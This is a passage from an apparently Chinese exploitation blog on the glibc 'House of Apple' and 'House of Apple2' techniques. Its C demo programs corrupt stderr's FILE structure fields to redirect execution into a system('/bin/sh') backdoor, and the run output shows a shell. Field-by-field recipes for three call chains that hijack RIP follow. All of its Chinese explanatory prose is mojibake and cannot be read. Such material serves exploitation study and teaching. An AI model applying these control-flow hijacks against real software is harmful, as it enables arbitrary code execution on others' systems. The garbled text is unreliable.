class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_wide_data_addr = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)sdterr_vtable_addr = (<span class="keyword">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁªìÊûúÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  <span class="built_in">exp</span> ./test</span><br><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f6c95c1c420</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f6c95d855e8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f6c95d85634</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f6c95d85660</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f6c95d85698</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f6c95d80c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall <span class="keyword">and</span> trigger house of apple</span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊàêÂäüÂØπÂ†Ü‰∏äÁöÑÊï∞ÊçÆËøõË°å‰∫Ü‰øÆÊîπ</li>
</ul>
<p>‰∏äÈù¢ËøôÁßçÁî®Ê≥ïÂè™ËÉΩÂÆûÁé∞Â∑≤Áü•Âú∞ÂùÄ‰ªªÊÑèÂÜôÔºàÂíå largebin attack ÁöÑÊïàÊûúÁ±ª‰ººÔºâÔºå‰∏ãÈù¢ËøôÁßçÂà©Áî®ÊñπÂºèÂèØ‰ª•Áõ¥Êé•Âä´ÊåÅÁ®ãÂ∫èÊµÅÁ®ãÔºàÁß∞‰∏∫ house of apple2Ôºâ</p>
<h2 id="House-Of-Apple2-ÂéüÁêÜ"><a href="#House-Of-Apple2-ÂéüÁêÜ" class="headerlink" title="House Of Apple2 ÂéüÁêÜ"></a>House Of Apple2 ÂéüÁêÜ</h2><p><code>stdin/stdout/stderr</code> Ëøô‰∏â‰∏™ <code>_IO_FILE</code> ÁªìÊûÑ‰Ωì‰ºö‰ª• <code>_IO_file_jumps</code> ‰∏∫ËôöË°®ÔºåËÄåÂÖ∂‰∏≠ÁöÑÂáΩÊï∞ <code>IO_validate_vtable</code> Ë¥üË¥£Ê£ÄÊü• <code>vtable</code> ÁöÑÂêàÊ≥ïÊÄß</p>
<p>‰ΩÜÂú®Ë∞ÉÁî®ËôöË°® <code>_wide_vtable</code> ÈáåÈù¢ÁöÑÂáΩÊï∞Êó∂ÔºåÂπ∂Ê≤°ÊúâÊ£ÄÊü• <code>vtable</code> ÁöÑÂêàÊ≥ïÊÄß</p>
<p>Âõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•Âä´ÊåÅ <code>IO_FILE</code> ÁöÑ <code>vtable</code> ‰∏∫ <code>_IO_wfile_jumps</code>ÔºåÊéßÂà∂ <code>_wide_data</code> ‰∏∫ÂèØÊéßÁöÑÂ†ÜÂú∞ÂùÄÁ©∫Èó¥ÔºåËøõËÄåÊéßÂà∂ <code>_wide_data-&gt;_wide_vtable</code> ‰∏∫ÂèØÊéßÁöÑÂ†ÜÂú∞ÂùÄÁ©∫Èó¥ÔºåÁÑ∂ÂêéÊéßÂà∂Á®ãÂ∫èÁöÑÊâßË°åÊµÅÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode -&gt; backdoor</span><br></pre></td></tr></table></figure>
<h2 id="House-Of-Apple2-Âà©Áî®ÂßøÂäø"><a href="#House-Of-Apple2-Âà©Áî®ÂßøÂäø" class="headerlink" title="House Of Apple2 Âà©Áî®ÂßøÂäø"></a>House Of Apple2 Âà©Áî®ÂßøÂäø</h2><p>‰ΩøÁî® house of apple2 ÁöÑÊù°‰ª∂‰∏∫Ôºö</p>
<ul>
<li>ËÉΩÊ≥ÑÈú≤Âá∫ <code>libc_base</code> Âú∞ÂùÄÂíå <code>heap_base</code> Âú∞ÂùÄ </li>
<li>ËÉΩÊéßÂà∂Á®ãÂ∫èÊâßË°å<code>IO</code>Êìç‰ΩúÔºö<ul>
<li>‰ªé <code>main</code> ÂáΩÊï∞ËøîÂõû</li>
<li>Ë∞ÉÁî® <code>exit</code> ÂáΩÊï∞</li>
<li>ÈÄöËøá <code>__malloc_assert</code> Ëß¶Âèë</li>
</ul>
</li>
<li>ËÉΩÊéßÂà∂ <code>_IO_FILE</code> ÁöÑ <code>vtable</code> Âíå <code>_wide_data</code>Ôºà‰∏ÄËà¨‰ΩøÁî® <code>largebin attack</code>ÂéªÊéßÂà∂Ôºâ</li>
</ul>
<p>‰ΩøÁî®Ê°à‰æãÂ¶Ç‰∏ãÔºöÔºà‰ΩøÁî® <code>_IO_wdefault_xsgetn</code> Ë∞ÉÁî®ÈìæÔºâ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="keyword">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *stderr2 = (<span class="keyword">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="keyword">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="keyword">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="keyword">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁªìÊûúÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  <span class="built_in">exp</span> ./test </span><br><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7fe29386f420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7fe2937eb000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7fe2939d85c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7fe2939d3c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: <span class="function">call <span class="title">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span></span><br><span class="line"><span class="function">$ whoami</span></span><br><span class="line"><span class="function">yhellow</span></span><br></pre></td></tr></table></figure>
<p>‰∏ãÈù¢ÁªôÂá∫Âá†Êù°Â•ΩÁî®ÁöÑË∞ÉÁî®ÈìæÂèäÂÖ∂Âà©Áî®ÊñπÂºèÔºö</p>
<p>Âà©Áî® <code>_IO_wfile_overflow</code> ÂáΩÊï∞ÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>~(2 | 0x8 | 0x800)</code></li>
<li><code>vtable</code> = <code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> ÁöÑÂú∞ÂùÄÔºàÂä†ÂáèÂÅèÁßªÔºâ</li>
<li><code>_wide_data</code> = ÂèØÊéßÂ†ÜÂú∞ÂùÄ<code>A</code>ÔºàÂç≥Êª°Ë∂≥ <code>*(fp+0xa0)=A</code>Ôºâ</li>
<li><code>_wide_data-&gt;_IO_write_base</code> = <code>0</code>ÔºàÂç≥Êª°Ë∂≥ <code>*(A+0x18)=0</code>Ôºâ</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>ÔºàÂç≥Êª°Ë∂≥ <code>*(A+0x30)=0</code>Ôºâ</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = ÂèØÊéßÂ†ÜÂú∞ÂùÄ<code>B</code>ÔºàÂç≥Êª°Ë∂≥ <code>*(A+0xe0)=B</code>Ôºâ</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = Âú∞ÂùÄ<code>C</code>ÔºåÁî®‰∫éÂä´ÊåÅ <code>RIP</code>ÔºàÂç≥Êª°Ë∂≥ <code>*(B+0x68)=C</code>Ôºâ</li>
</ul>
<p>Âà©Áî® <code>_IO_wfile_underflow_mmap</code> ÂáΩÊï∞ÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>~4</code></li>
<li><code>vtable</code> ËÆæÁΩÆ‰∏∫ <code>_IO_wfile_jumps_mmap</code> Âú∞ÂùÄÔºàÂä†ÂáèÂÅèÁßªÔºâ</li>
<li><code>_IO_read_end &gt; _IO_read_ptr</code>Ôºà‰∏çËøõÂÖ•Ë∞ÉÁî®Ôºâ</li>
<li><code>_wide_data</code> ËÆæÁΩÆ‰∏∫ÂèØÊéßÂ†ÜÂú∞ÂùÄ <code>A</code>ÔºàÂç≥Êª°Ë∂≥<code>*(fp+0xa0)=A</code>Ôºâ</li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>ÔºàÂç≥Êª°Ë∂≥<code>*A&gt;=*(A+8)</code>Ôºâ</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>ÔºàÂç≥Êª°Ë∂≥<code>*(A+0x30)=0</code>Ôºâ</li>
<li><code>_wide_data-&gt;_IO_save_base</code> = <code>0</code>ÔºàÂç≥Êª°Ë∂≥<code>*(A+0x40)=0</code>Ôºâ</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = ÂèØÊéßÂ†ÜÂú∞ÂùÄ<code>B</code>ÔºàÂç≥Êª°Ë∂≥<code>*(A+0xe0)=B</code>Ôºâ</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = Âú∞ÂùÄ<code>C</code>ÔºåÁî®‰∫éÂä´ÊåÅ <code>RIP</code>ÔºàÂç≥Êª°Ë∂≥<code>*(B+0x68)=C</code>Ôºâ</li>
<li>PSÔºöËøôÊù°ÈìæÊâßË°åÁöÑÊù°‰ª∂ÊòØË∞ÉÁî®Âà∞ <code>_IO_wdefault_xsgetn</code> Êó∂ <code>RDX</code> ÂØÑÂ≠òÂô®‰∏çËÉΩ‰∏∫‚Äú0‚Äù</li>
</ul>
<p>Âà©Áî® <code>_IO_wdefault_xsgetn</code> ÂáΩÊï∞ÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>0x800</code></li>
<li><code>vtable</code> = <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> Âú∞ÂùÄÔºàÂä†ÂáèÂÅèÁßªÔºâ</li>
<li><code>_mode</code> &gt; <code>0</code>ÔºàÂç≥Êª°Ë∂≥<code>*(fp+0xc0)&gt;0</code>Ôºâ</li>
<li><code>_wide_data</code> = ÂèØÊéßÂ†ÜÂú∞ÂùÄ<code>A</code>ÔºàÂç≥Êª°Ë∂≥<code>*(fp+0xa0)=A</code>Ôºâ</li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> = <code>0</code>ÔºàÂç≥Êª°Ë∂≥ <code>*(A+8)=*A</code>Ôºâ</li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>ÔºàÂç≥Êª°Ë∂≥<code>*(A+0x20)&gt;*(A+0x18)</code>Ôºâ</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = ÂèØÊéßÂ†ÜÂú∞ÂùÄ<code>B</code>ÔºàÂç≥Êª°Ë∂≥<code>*(A+0xe0)=B</code>Ôºâ</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> = Âú∞ÂùÄ<code>C</code>ÔºåÁî®‰∫éÂä´ÊåÅ<code>RIP</code>ÔºàÂç≥Êª°Ë∂≥<code>*(B+0x18)=C</code>Ôºâ</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">333</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">171</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 ‚Äì 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">75:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
